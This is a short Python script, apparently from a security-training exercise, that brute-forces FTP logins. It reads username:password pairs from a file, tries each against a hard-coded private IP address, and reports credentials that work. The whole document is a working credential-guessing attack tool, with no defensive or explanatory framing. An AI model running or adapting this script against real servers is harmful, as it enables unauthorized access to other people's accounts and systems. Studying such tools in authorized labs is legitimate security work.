''' brute force login'''
import ftplib


def brute_login(hostname, passwd_file):
    ''' brute force login'''
    with open(passwd_file, 'r', encoding='utf-8-sig') as pf:
        for line in pf.readlines():
            userName = line.split(':')[0]
            passWord = line.split(':')[1].strip('\r').strip('\n')
            print(f'[+] Trying: {userName}/{passWord}')
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(userName, passWord)
                print(f'[*] {str(hostname)} FTP Logon Succeeded: {userName}/{passWord}')
                ftp.quit()
                return (userName, passWord)
            except Exception as e:
                pass
    print('[-] Could not brute force FTP credentials.')
    return (None, None)


def main():
    ''' main '''
    host = '192.168.95.179'
    passwd_file = r'data/userpass.txt'
    print('[+] Starting FTP brute force')
    brute_login(host, passwd_file)
    print('[+] FTP brute force finished')


if __name__ == '__main__':
    main()
